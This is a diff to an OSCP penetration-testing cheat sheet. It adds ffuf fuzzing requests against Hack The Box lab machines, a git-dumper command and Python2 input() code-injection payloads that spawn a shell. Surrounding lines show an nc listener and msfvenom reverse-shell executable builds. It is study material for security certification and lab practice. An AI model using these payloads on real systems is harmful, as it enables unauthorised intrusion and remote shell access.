@@ -63,9 +63,12 @@ This repository describes cheat sheet and knowledge for OSCP.
   - [truffleHog](#trufflehog)
     - [Scan GitHub](#scan-github)
 - [Fuzz](#fuzz)
-  - [fuff](#fuff)
+  - [ffuf](#ffuf)
     - [Basic usage](#basic-usage)
     - [Special Character Fuzz](#special-character-fuzz)
+    - [Subdomain Fuzz](#subdomain-fuzz)
+- [Git](#git)
+  - [Dump .git](#dump-git)
 - [Linux command](#linux-command)
   - [Basic command](#basic-command)
     - [Show allowing commands as root user](#show-allowing-commands-as-root-user)
@@ -75,6 +78,7 @@ This repository describes cheat sheet and knowledge for OSCP.
     - [Read from standard input and write to standard output and files](#read-from-standard-input-and-write-to-standard-output-and-files)
     - [rlwrap](#rlwrap)
       - [nc (Listen port 9001)](#nc-listen-port-9001)
+    - [Extract information from /etc/passwd](#extract-information-from-etcpasswd)
   - [Disable password checking for sudo](#disable-password-checking-for-sudo)
   - [Docker](#docker)
     - [Get a subsection in JSON format](#get-a-subsection-in-json-format)
@@ -90,10 +94,16 @@ This repository describes cheat sheet and knowledge for OSCP.
     - [Create New file](#create-new-file)
     - [Display the contents of a text file](#display-the-contents-of-a-text-file)
     - [Get a file via HTTP (equivalent to wget)](#get-a-file-via-http-equivalent-to-wget)
-- [Python Standard Library](#python-standard-library)
+- [Python](#python)
   - [Run HTTP Server](#run-http-server)
     - [python3](#python3)
     - [python2](#python2)
+  - [Run system command by using dynamic import](#run-system-command-by-using-dynamic-import)
+  - [Exploitable python functions](#exploitable-python-functions)
+    - [Python2](#python2-1)
+      - [input()](#input)
+- [PHP](#php)
+  - [Detect exploitable function (e.g. RCE)](#detect-exploitable-function-eg-rce)
 - [Reverse shell](#reverse-shell)
   - [php-reverse-shell](#php-reverse-shell)
   - [Reverse shell cheat sheet](#reverse-shell-cheat-sheet)
@@ -109,8 +119,8 @@ This repository describes cheat sheet and knowledge for OSCP.
     - [Windows](#windows)
       - [exe](#exe)
       - [exe-service](#exe-service)
-  - [BurpSuite](#burpsuite)
-    - [Hot Keys](#hot-keys)
+- [BurpSuite](#burpsuite)
+  - [Hot Keys](#hot-keys)
 - [Others](#others)
   - [References for OSCP](#references-for-oscp)
     - [GTFOBins](#gtfobins)
@@ -332,14 +342,62 @@ docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --re
 ```
 
 # Fuzz
-## fuff
+## ffuf
 ### Basic usage
 ```
-fuff -request <request file> -request-proto http -w <wordlist (e.g. SecList)>
+ffuf -request <request file> -request-proto http -w <wordlist (e.g. SecList)>
 ```
 ### Special Character Fuzz
 ```
-fuff -request test.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt
+ffuf -request test_spchars.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt
+```
+test_spchars.req is defined as follows [Hack the box: Busqueda](https://app.hackthebox.com/machines/Busqueda):
+```
+POST /search HTTP/1.1
+Host: searcher.htb
+Content-Length: 25
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://searcher.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://searcher.htb/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: close
+
+engine=Google&query=abcdeFUZZ
+```
+
+### Subdomain Fuzz
+```
+ffuf -request test_subdomain.req -request-proto http -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+```
+test_subdomain.req is defined as follows ([Hack the box: updown](https://app.hackthebox.com/machines/UpDown)):
+```
+POST / HTTP/1.1
+Host: FUZZ.siteisup.htb
+Content-Length: 36
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://siteisup.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://siteisup.htb/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: close
+
+site=http%3A%2F%2Fgoogle.com&debug=1
+```
+
+# Git
+## Dump .git
+https://github.com/arthaud/git-dumper
+```
+git-dumper http://siteisup.htb/dev/.git dev
 ```
 
 # Linux command
@@ -379,6 +437,14 @@ https://linux.die.net/man/1/rlwrap
 ```
 rlwrap -cAr nc -lnvp 9001
 ```
+
+### Extract information from /etc/passwd
+Extract information except "false", "nologin", and "sync" from /etc/passwd
+```
+cat /etc/passwd | grep -v -e false -e nologin -e sync
+```
+false, nologin: Disallow login
+sync: Sync disk(?)
 
 ## Disable password checking for sudo
 ```
@@ -447,7 +513,7 @@ iwr http://example.com/file.zip -OutFile C:\path\to\save\file.zip
 ```
 
 
-# Python Standard Library
+# Python
 ## Run HTTP Server
 ### python3
 ```
@@ -456,6 +522,50 @@ python -m http.server <port>
 ### python2
 ```
 python -m SimpleHTTPServer <port>
+```
+
+## Run system command by using dynamic import
+```python
+__import__('os').system('id')
+```
+```python
+__import__('os').system('/bin/bash')
+```
+
+## Exploitable python functions
+### Python2
+#### input()
+The input() function in Python2 is known to be insecure, as it acts similar to the eval(). 
+Reference: [HackTheBox "UpDown" Writeup](https://app.hackthebox.com/machines/Busqueda/writeups)
+Example:
+```python
+import requests
+url = input("Enter URL here:")
+page = requests.get(url)
+if page.status_code == 200:
+print "Website is up"
+else:
+print "Website is down"
+```
+This script uses input(). When asking for input, we can exploit this by using the following commands.
+```python
+__import__('os').system('id')
+```
+```python
+__import__('os').system('/bin/bash')
+```
+
+# PHP
+## Detect exploitable function (e.g. RCE)
+dfunc-bypasser detects exploitable legacy function.
+Python3.
+https://github.com/rootsecdev/dfunc-bypasser
+
+Python2 (original):
+https://github.com/teambi0s/dfunc-bypasser/tree/master
+
+```
+python dfunc-bypasser.py --url https://example.com/phpinfo.php
 ```
 
 # Reverse shell
@@ -508,8 +618,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -e x86/shikata
 msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -e x86/shikata_ga_nai -f exe-service -o evil.exe
 ```
 
-## BurpSuite
-### Hot Keys
+# BurpSuite
+## Hot Keys
 https://github.com/rinetd/BurpSuite-1/blob/master/CheatSheet.md
 
 # Others
